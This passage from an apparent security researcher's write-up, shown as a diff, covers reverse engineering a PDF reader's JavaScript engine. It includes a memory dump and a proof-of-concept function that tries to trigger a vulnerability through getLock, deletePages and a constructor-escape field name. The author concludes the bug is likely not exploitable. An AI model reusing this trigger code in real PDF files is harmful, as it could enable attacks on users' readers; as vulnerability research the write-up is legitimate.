@@ -1031,3 +1031,48 @@ bunch of code ommited in order to fit stuff and not make it long
 ![WhatsApp Image 2025-04-18 at 17 20 10](https://github.com/user-attachments/assets/b662361b-4aee-49a3-9b56-a2ac33bd1574)
 
 And one might say a class initialisation because of this. Wrong dont trust ida because the offsets were off, and even if i were to be wrong belive me you'd still have to cross ref the function name and in 200 cross refs to analyse another 200 function to understand and on top of that dynamically resolve in windbg every ptr function call and reverse that.
+
+Add the fact that if you say try something like this 
+09f69e70  74 72 75 63 74 6f 72 28-27 72 65 74 75 72 6e 20  tructor('return 
+09f69e80  74 68 69 73 27 29 28 29-00 00 00 00 00 00 00 00  this')()........
+09f69e90  06 00 01 09 30 1e 6d 0f-00 00 00 00 00 00 00 00  ....0.m.........
+09f69ea0  00 00 00 00 e0 bd 6d 0f-10 00 00 00 02 00 00 00  ......m.........
+09f69eb0  84 15 f6 09 60 15 f6 09-0a 00 00 00 00 00 00 00  ....`...........
+09f69ec0  01 00 00 00 10 00 00 00-10 00 00 00 54 00 69 00  ............T.i.
+09f69ed0  6d 00 65 00 73 00 20 00-42 00 6f 00 6c 00 64 00  m.e.s. .B.o.l.d.
+09f69ee0  49 00 74 00 61 00 6c 00-69 00 63 00 00 00 00 00  I.t.a.l.i.c.....
+function type_conf(){
+    app.alert("Starting enhanced memory leak exploit");
+    
+    // Step 2: Create form fields
+    gFields.signature = app.activeDocs[0].addField(
+      "signature_field",
+      "signature",
+      0,
+      [10, 10, 100, 50]
+    );
+
+    let syntaxString = "a.constructor.constructor('return this')()";
+
+
+    gFields.combo = app.activeDocs[0].addField(
+      syntaxString,
+      "combobox",
+      0,
+      [10, 60, 100, 100]
+    );
+    
+    // Step 4: Get the critical Lock object
+    gLockObj = gFields.signature.getLock();
+    app.alert("Got Lock object from signature field");
+    
+    app.alert("Triggering vulnerability with deletePages()");
+    app.activeDocs[0].deletePages();
+    app.alert("Vulnerability triggered");
+    
+    gLockObj.__defineGetter__('fields', function () {}); 
+}
+
+and it works but you can't have something like this  let x = "\x41\x41\x41\x41" and x be used in addfield as name of said object , wait 3:30 hours to load idb in bindiff and idb not to load and exhaust 16gb of memory. those are pretty much signs that you won't be able to most likely exploit that said binary. 
+
+So lesson learned if you see that most of described things in upper paragraph 
